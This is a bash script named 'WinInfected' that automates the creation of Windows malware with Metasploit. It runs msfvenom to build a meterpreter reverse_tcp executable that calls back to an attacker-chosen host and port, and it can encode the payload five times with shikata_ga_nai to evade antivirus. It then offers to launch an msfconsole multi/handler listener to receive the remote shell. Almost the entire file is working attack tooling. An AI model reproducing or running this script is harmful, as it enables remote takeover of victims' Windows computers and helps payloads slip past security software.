#!/bin/bash

show_help() {
  echo "WinInfected v1.2"
  echo "Usage: sudo wininfected [LHOST] [LPORT] [--obfuscate]"
  echo
  echo "Example: sudo wininfected 192.168.1.1 4444 --obfuscate"
  echo "Options:"
  echo "  --dependencies   Check and install missing dependencies."
  echo "  --update         Update script and dependencies."
  echo "  --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder."
  echo "  -h, --help       Display this help message."
  echo
  echo "More information: https://github.com/byfranke/wininfected"
  echo
}

detect_package_manager() {
  if command -v apt &> /dev/null; then
    PKG_MANAGER="apt"
  elif command -v pacman &> /dev/null; then
    PKG_MANAGER="pacman"
  elif command -v dnf &> /dev/null; then
    PKG_MANAGER="dnf"
  elif command -v yum &> /dev/null; then
    PKG_MANAGER="yum"
  elif command -v zypper &> /dev/null; then
    PKG_MANAGER="zypper"
  else
    echo "Unsupported package manager. Install Metasploit manually."
    exit 1
  fi
}

check_and_install_dependencies() {
  echo "Checking and installing dependencies..."
  
  detect_package_manager

  if ! command -v msfvenom &> /dev/null; then
    echo "msfvenom not found, installing Metasploit Framework..."
    case $PKG_MANAGER in
      apt)
        sudo apt update && sudo apt install metasploit-framework -y
        ;;
      pacman)
        sudo pacman -Sy --noconfirm metasploit
        ;;
      dnf)
        sudo dnf install metasploit -y
        ;;
      yum)
        sudo yum install metasploit -y
        ;;
      zypper)
        sudo zypper install metasploit
        ;;
    esac
  else
    echo "Metasploit Framework is already installed."
  fi
}

update_script_and_dependencies() {
  echo "Updating Metasploit Framework..."
  
  detect_package_manager

  case $PKG_MANAGER in
    apt)
      sudo apt update && sudo apt install metasploit-framework -y
      ;;
    pacman)
      sudo pacman -Sy --noconfirm metasploit
      ;;
    dnf)
      sudo dnf upgrade metasploit -y
      ;;
    yum)
      sudo yum update metasploit -y
      ;;
    zypper)
      sudo zypper update metasploit
      ;;
  esac
  
  echo "Script and dependencies updated successfully."
}

validate_arguments() {
  if ! [[ "$LHOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid LHOST format."
    exit 1
  fi

  if ! [[ "$LPORT" =~ ^[0-9]+$ ]]; then
    echo "Error: Invalid LPORT format."
    exit 1
  fi
}

create_payload() {
  if [ "$OBFUSCATE" -eq 1 ]; then
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i 5 -f exe -o "$PAYLOAD_PATH"
  else
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$PAYLOAD_PATH"
  fi

  if [ ! -f "$PAYLOAD_PATH" ]; then
    echo "Failed to create payload with msfvenom."
    exit 1
  fi
}

log_action() {
  LOGFILE="wininfected.log"
  echo "$(date) - $1" >> "$LOGFILE"
}

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

if [ "$#" -eq 0 ] || [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
  show_help
  exit 0
elif [ "$1" == "--dependencies" ]; then
  check_and_install_dependencies
  exit 0
elif [ "$1" == "--update" ]; then
  update_script_and_dependencies
  exit 0
fi

if [ "$#" -lt 2 ]; then
  echo "Error: Missing arguments."
  show_help
  exit 1
fi

LHOST="$1"
LPORT="$2"
OBFUSCATE=0

if [ "$#" -ge 3 ] && [ "$3" == "--obfuscate" ]; then
  OBFUSCATE=1
fi

validate_arguments

PAYLOAD_DIR="$(pwd)"
PAYLOAD_NAME="payload_$(date +%Y%m%d_%H%M%S).exe"
PAYLOAD_PATH="$PAYLOAD_DIR/$PAYLOAD_NAME"

create_payload

log_action "Payload created successfully: $PAYLOAD_PATH"

echo "Payload created successfully: $PAYLOAD_PATH"
read -p "Do you want to start msfconsole to listen for connections? (y/n): " start_msf

if [ "$start_msf" == "y" ]; then
  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j;"
elif [ "$start_msf" == "n" ]; then
  echo "Exiting script."
else
  echo "Invalid option, exiting."
fi
